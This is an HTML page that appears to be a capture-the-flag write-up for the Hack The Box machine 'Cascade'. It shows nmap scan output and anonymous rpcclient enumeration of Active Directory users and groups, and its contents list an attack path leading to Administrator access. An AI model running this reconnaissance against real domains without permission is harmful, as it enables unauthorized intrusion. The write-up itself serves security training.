                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntemplate/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntemplate
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../codereview/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    codereview
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../commandinjection/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    commandinjection
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../gpo/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    gpo
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linux/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    linux
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../history/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    history
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../laps/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    LAPS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mssql/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    mssql
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC9/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC9
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Impersonation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Impersonation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Vhosts/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Vhosts
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC16/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC16
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC15/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC15
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../shadowcredential/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    shadowcredential
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ADdisabledaccount/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ADdisabledaccount
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#intro" class="md-nav__link">
    <span class="md-ellipsis">
      Intro
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#add-machine-to-etchosts" class="md-nav__link">
    <span class="md-ellipsis">
      Add machine to /etc/hosts
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nmap-scan" class="md-nav__link">
    <span class="md-ellipsis">
      Nmap scan
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpc-enumeration-port-135" class="md-nav__link">
    <span class="md-ellipsis">
      RPC enumeration (port 135)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="RPC enumeration (port 135)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#anonymous-login" class="md-nav__link">
    <span class="md-ellipsis">
      Anonymous login:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration-port-139445" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration (port 139/445)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SMB enumeration (port 139/445)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enum4linux" class="md-nav__link">
    <span class="md-ellipsis">
      enum4linux
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#via-anonymous-logon" class="md-nav__link">
    <span class="md-ellipsis">
      via anonymous logon
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldap-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="LDAP enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#gather-all-users-optional" class="md-nav__link">
    <span class="md-ellipsis">
      Gather all users (optional)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-if-anonymous-login-is-allowed" class="md-nav__link">
    <span class="md-ellipsis">
      check if anonymous login is allowed
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#foothold" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Foothold">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#checking-access-to-services" class="md-nav__link">
    <span class="md-ellipsis">
      Checking access to services
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-login-via-rthompson" class="md-nav__link">
    <span class="md-ellipsis">
      SMB login via r.thompson
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SMB login via r.thompson">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#downloading-and-inspecting-the-smb-shares" class="md-nav__link">
    <span class="md-ellipsis">
      Downloading and inspecting the SMB shares
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#decrypting-encrypted-text" class="md-nav__link">
    <span class="md-ellipsis">
      Decrypting encrypted text
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#logging-in-as-ssmith" class="md-nav__link">
    <span class="md-ellipsis">
      Logging in as s.smith
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privesc" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Privesc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bloodhound" class="md-nav__link">
    <span class="md-ellipsis">
      BloodHound
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#group-membership-of-user-ssmith" class="md-nav__link">
    <span class="md-ellipsis">
      Group membership of user s.smith
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#local-group-details" class="md-nav__link">
    <span class="md-ellipsis">
      Local group details
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#viewing-files-contained-inside-the-share" class="md-nav__link">
    <span class="md-ellipsis">
      Viewing files contained inside the share
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#debugging-the-app" class="md-nav__link">
    <span class="md-ellipsis">
      Debugging the app
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reverse-the-encryption-process" class="md-nav__link">
    <span class="md-ellipsis">
      Reverse the encryption process
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#logging-in-as-arksvc" class="md-nav__link">
    <span class="md-ellipsis">
      Logging in as ArkSvc
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bloodhound-as-arksvc" class="md-nav__link">
    <span class="md-ellipsis">
      Bloodhound as ArkSvc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Bloodhound as ArkSvc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#why-bloodhound-needs-dns-tcp-and-dns-timeout" class="md-nav__link">
    <span class="md-ellipsis">
      Why BloodHound needs --dns-tcp and --dns-timeout
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#group-membership-of-arksvc" class="md-nav__link">
    <span class="md-ellipsis">
      Group membership of ArkSvc
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#retrieving-deleted-objects-from-recycle-bin" class="md-nav__link">
    <span class="md-ellipsis">
      Retrieving deleted objects from Recycle Bin
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#logging-in-as-administrator" class="md-nav__link">
    <span class="md-ellipsis">
      Logging in as Administrator
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      Summary
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Summary">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reconnaissance_1" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#foothold_1" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privesc_1" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sidenotes" class="md-nav__link">
    <span class="md-ellipsis">
      Sidenotes
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



<h2 id="intro">Intro</h2>
<p><img alt="" src="../MediaFiles/Pasted%20image%2020250702081108.png" /></p>
<p>[[windows]] [[NotAssumedBreach]] [[codereview]] [[RecycleBin]] [[OSCPpath]]</p>
<p>Tags: #windows #NotAssumedBreach #codereview #RecycleBin #OSCPpath <br />
Tools used:<br />
enum4linux (enumerating smb)<br />
ldapsearch (ldap enumeration)<br />
netexec (inspecting access to services for given creds)<br />
jetbrains DotPeek (debugging the .net app)</p>
<hr />
<h1 id="reconnaissance">Reconnaissance</h1>
<h4 id="add-machine-to-etchosts">Add machine to <code>/etc/hosts</code></h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;10.10.10.182 cascade.htb&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
</span></code></pre></div>
<h4 id="nmap-scan">Nmap scan</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>cascade.htb
</span></code></pre></div>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.95<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-07-02<span class="w"> </span><span class="m">01</span>:22<span class="w"> </span>EDT
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>cascade.htb<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.10.182<span class="o">)</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.048s<span class="w"> </span>latency<span class="o">)</span>.
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">985</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="m">53</span>/tcp<span class="w">    </span>open<span class="w">  </span>domain<span class="w">        </span>Microsoft<span class="w"> </span>DNS<span class="w"> </span><span class="m">6</span>.1.7601<span class="w"> </span><span class="o">(</span>1DB15D39<span class="o">)</span><span class="w"> </span><span class="o">(</span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="w"> </span>SP1<span class="o">)</span>
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="p">|</span><span class="w"> </span>dns-nsid:<span class="w"> </span>
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="p">|</span>_<span class="w">  </span>bind.version:<span class="w"> </span>Microsoft<span class="w"> </span>DNS<span class="w"> </span><span class="m">6</span>.1.7601<span class="w"> </span><span class="o">(</span>1DB15D39<span class="o">)</span>
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="m">88</span>/tcp<span class="w">    </span>open<span class="w">  </span>kerberos-sec<span class="w">  </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Kerberos<span class="w"> </span><span class="o">(</span>server<span class="w"> </span>time:<span class="w"> </span><span class="m">2025</span>-07-02<span class="w"> </span><span class="m">05</span>:22:52Z<span class="o">)</span>
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="m">135</span>/tcp<span class="w">   </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="m">139</span>/tcp<span class="w">   </span>open<span class="w">  </span>netbios-ssn<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="m">389</span>/tcp<span class="w">   </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>cascade.local,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="m">445</span>/tcp<span class="w">   </span>open<span class="w">  </span>microsoft-ds?
</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="m">636</span>/tcp<span class="w">   </span>open<span class="w">  </span>tcpwrapped
</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="m">3268</span>/tcp<span class="w">  </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>cascade.local,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="m">3269</span>/tcp<span class="w">  </span>open<span class="w">  </span>tcpwrapped
</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="m">5985</span>/tcp<span class="w">  </span>open<span class="w">  </span>http<span class="w">          </span>Microsoft<span class="w"> </span>HTTPAPI<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span><span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-HTTPAPI/2.0
</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="p">|</span>_http-title:<span class="w"> </span>Not<span class="w"> </span>Found
</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="m">49154</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="m">49155</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a><span class="m">49157</span>/tcp<span class="w"> </span>open<span class="w">  </span>ncacn_http<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a><span class="m">49158</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a><span class="m">49165</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span>CASC-DC1<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows_server_2008:r2:sp1,<span class="w"> </span>cpe:/o:microsoft:windows
</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>
</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a>Host<span class="w"> </span>script<span class="w"> </span>results:
</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a><span class="p">|</span><span class="w"> </span>smb2-time:<span class="w"> </span>
</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a><span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2025</span>-07-02T05:23:44
</span><span id="__span-2-30"><a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a><span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span><span class="m">2025</span>-07-02T05:21:04
</span><span id="__span-2-31"><a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a><span class="p">|</span><span class="w"> </span>smb2-security-mode:<span class="w"> </span>
</span><span id="__span-2-32"><a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a><span class="p">|</span><span class="w">   </span><span class="m">2</span>:1:0:<span class="w"> </span>
</span><span id="__span-2-33"><a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a><span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>and<span class="w"> </span>required
</span><span id="__span-2-34"><a id="__codelineno-2-34" name="__codelineno-2-34" href="#__codelineno-2-34"></a>
</span><span id="__span-2-35"><a id="__codelineno-2-35" name="__codelineno-2-35" href="#__codelineno-2-35"></a>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
</span><span id="__span-2-36"><a id="__codelineno-2-36" name="__codelineno-2-36" href="#__codelineno-2-36"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">100</span>.34<span class="w"> </span>seconds
</span></code></pre></div>
<h3 id="rpc-enumeration-port-135">RPC enumeration (port 135)</h3>
<h4 id="anonymous-login">Anonymous login:</h4>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-N<span class="w"> </span>cascade.htb
</span></code></pre></div>
<p>lets enumerate domains<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>enumdomains
</span></code></pre></div></p>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>rpcclient<span class="w"> </span>$&gt;<span class="w"> </span>enumdomains
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>name:<span class="o">[</span>CASCADE<span class="o">]</span><span class="w"> </span>idx:<span class="o">[</span>0x0<span class="o">]</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>name:<span class="o">[</span>Builtin<span class="o">]</span><span class="w"> </span>idx:<span class="o">[</span>0x0<span class="o">]</span>
</span></code></pre></div>
<p>lets enumerate the domain users<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>enumdomusers
</span></code></pre></div></p>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>rpcclient<span class="w"> </span>$&gt;<span class="w"> </span>enumdomusers
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>user:<span class="o">[</span>CascGuest<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x1f5<span class="o">]</span>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>user:<span class="o">[</span>arksvc<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x452<span class="o">]</span>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>user:<span class="o">[</span>s.smith<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x453<span class="o">]</span>
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>user:<span class="o">[</span>r.thompson<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x455<span class="o">]</span>
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>user:<span class="o">[</span>util<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x457<span class="o">]</span>
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>user:<span class="o">[</span>j.wakefield<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x45c<span class="o">]</span>
</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>user:<span class="o">[</span>s.hickson<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x461<span class="o">]</span>
</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>user:<span class="o">[</span>j.goodhand<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x462<span class="o">]</span>
</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>user:<span class="o">[</span>a.turnbull<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x464<span class="o">]</span>
</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>user:<span class="o">[</span>e.crowe<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x467<span class="o">]</span>
</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>user:<span class="o">[</span>b.hanson<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x468<span class="o">]</span>
</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>user:<span class="o">[</span>d.burman<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x469<span class="o">]</span>
</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>user:<span class="o">[</span>BackupSvc<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x46a<span class="o">]</span>
</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>user:<span class="o">[</span>j.allen<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x46e<span class="o">]</span>
</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a>user:<span class="o">[</span>i.croft<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x46f<span class="o">]</span>
</span></code></pre></div>
<p>lets enumerate the domain groups<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>enumdomgroups
</span></code></pre></div></p>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>rpcclient<span class="w"> </span>$&gt;<span class="w"> </span>enumdomgroups
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>group:<span class="o">[</span>Enterprise<span class="w"> </span>Read-only<span class="w"> </span>Domain<span class="w"> </span>Controllers<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x1f2<span class="o">]</span>
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>group:<span class="o">[</span>Domain<span class="w"> </span>Users<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x201<span class="o">]</span>
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>group:<span class="o">[</span>Domain<span class="w"> </span>Guests<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x202<span class="o">]</span>
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>group:<span class="o">[</span>Domain<span class="w"> </span>Computers<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x203<span class="o">]</span>
</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>group:<span class="o">[</span>Group<span class="w"> </span>Policy<span class="w"> </span>Creator<span class="w"> </span>Owners<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x208<span class="o">]</span>
